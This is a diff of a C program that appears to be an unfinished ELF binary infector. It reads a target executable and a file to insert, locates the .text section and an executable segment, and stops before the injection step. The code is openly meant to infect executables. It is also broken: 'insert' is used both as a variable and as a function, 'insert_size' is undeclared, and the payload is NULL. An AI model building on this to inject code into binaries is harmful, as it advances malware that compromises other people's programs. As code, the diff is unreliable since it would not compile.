@@ -9,59 +9,49 @@
 #include <errno.h>
 #include <elf.h>
 
+#include <log.h>
+
 #include "config.h"
 #include "elf-parser.h"
+#include "utils.h"
+
+#define PAGE_SIZE 0x1000
 
 int main(int argc, char **argv)
 {
-    int fd;					// File descriptor the file to infect
-    struct stat *to_infect_stat = NULL;		// Structure to save the stat of the file to infect
-    byte *to_infect_content = NULL;		// Buffer that contents the 
-    Elf64_Shdr *text_section;			// ELF Section header for the .text section
+    byte *to_infect_content = NULL;			// Buffer that contents the 
+    Elf64_Shdr *text_section;				// ELF Section header for the .text section
+    Elf64_Phdr *exe_seg;				// ELF Program header of an executable segment
+    byte *start_of_text_section;			// Pointer to the start and the end of the .text section
+    byte *start_of_seg, *end_of_seg;
+
+    byte *payload = NULL;
+    uint16_t payload_size;
 
     // We check if the usage is correct
     if (argc != EXPECTED_ARGC) {
-	fprintf(stderr, "Usage: %s <file-to-infect>", argv[0]);
+	fprintf(stderr, "Usage: %s <file-to-infect> <file-to-insert>", argv[0]);
 	exit(EXIT_FAILURE);
     }
 
-    // We read read the file content
-    fd = open(argv[1], O_RDONLY);
-    if (fd == -1) {
-	perror("open error :");
-	exit(EXIT_FAILURE);
-    }
+    to_infect_content = read_file(argv[1], NULL); 
+    insert = read_file(argv[2], &insert_size);
 
-    to_infect_stat = malloc(sizeof(struct stat));
-    if (to_infect_stat == NULL) {
-	perror("malloc error :");
-	exit(EXIT_FAILURE);
-    }
-
-    if (fstat(fd, to_infect_stat)) {
-	perror("fstat error :");
-	exit(EXIT_FAILURE);
-    }
-
-    to_infect_content = calloc(to_infect_stat->st_size, sizeof(byte));
-    if (to_infect_content == NULL) {
-	perror("calloc error:");
-	exit(EXIT_FAILURE);
-    }
-
-    if (read(fd, to_infect_content, to_infect_stat->st_size) != to_infect_stat->st_size) {
-	fprintf(stderr, "read error");
-	exit(EXIT_FAILURE);
-    }
-
-    close(fd);
-
+    insert(to_infect_content, payload, payload_size);
+    
     setup_elf(to_infect_content);
     text_section = get_section_by_name(".text");
+    exe_seg = get_exe_segment();
+
     if (text_section == NULL) {
 	fprintf(stderr, "Get section failed");
-	exit(1);
+	exit(EXIT_FAILURE);
     }
+    
+    start_of_text_section = to_infect_content + text_section->sh_offset;
+    start_of_seg = to_infect_content + exe_seg->p_offset;
+    end_of_seg = start_of_seg + exe_seg->p_filesz;
 
+    // Now we manage the insert
     return EXIT_SUCCESS;
 }
